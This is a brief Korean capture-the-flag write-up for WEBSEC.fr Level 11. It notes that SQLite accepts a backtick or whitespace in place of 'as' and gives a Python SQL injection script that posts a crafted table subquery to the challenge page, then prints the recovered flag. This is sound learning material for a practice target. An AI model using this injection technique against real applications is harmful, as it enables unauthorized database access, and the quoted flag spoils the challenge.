# WEBSEC.fr Level 11

`sqLite` 에서 `as` 는 \`혹은  `whitespace` 로 치환 가능

**ex** ; 

- `select a as b`
- select a ` b
- select a b



## Exploit - Python Code

```python
from requests import *
import re

url = 'http://websec.fr/level11/index.php'

def data(i):
    return {
    'user_id': i,
    'table': '(select 3 id,enemy username from costume)',
    'submit': 'submit'
    }

for i in range(1,100):
    res = post(url, data=data(i))
    if "WEBSEC{" in res.text:
        flag = re.findall("WEBSEC\{(.*?)\}",res.text)[0]
        print("flag: WEBSEC{"+flag+"}")
        break
```



## Result

```bash
flag: WEBSEC{Who_needs_AS_anyway_when_you_have_sqlite}
```

